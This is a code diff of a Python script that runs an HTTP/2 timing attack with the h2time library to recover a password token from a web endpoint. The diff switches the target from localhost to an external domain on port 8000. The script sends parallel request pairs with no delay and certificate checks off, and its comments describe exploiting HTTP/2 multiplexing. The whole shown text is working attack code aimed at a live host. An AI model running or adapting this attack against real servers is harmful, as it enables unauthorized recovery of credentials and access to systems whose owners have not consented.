@@ -9,11 +9,13 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('research')
 logging.getLogger('H2Protocol').setLevel(logging.WARNING)  # Disable H2Protocol logger
 
+BASE_URL = "https://hurtleturtle.co.uk:8000"
+
 async def create_auth_request(token: str) -> H2Request:
     """Create an H2Request with the specified Authorization token."""
     return H2Request(
         method="GET",
-        url=f"https://localhost:8000/process?password={token}",
+        url=f"{BASE_URL}/process?password={token}",
         headers={
             "User-Agent": "h2time/0.1"
         }
@@ -31,7 +33,7 @@ async def perform_timing_attack(token_prefix: str) -> set:
         r2 = await create_auth_request(token_prefix + "$")  # Control character
         
         async with H2Time(r1, r2, 
-                         num_request_pairs=10,
+                         num_request_pairs=5,
                          sequential=False,  # Important: Use parallel mode to exploit HTTP/2 multiplexing
                          inter_request_time_ms=0,  # No delay between requests
                          verify_cert=False) as h2t:
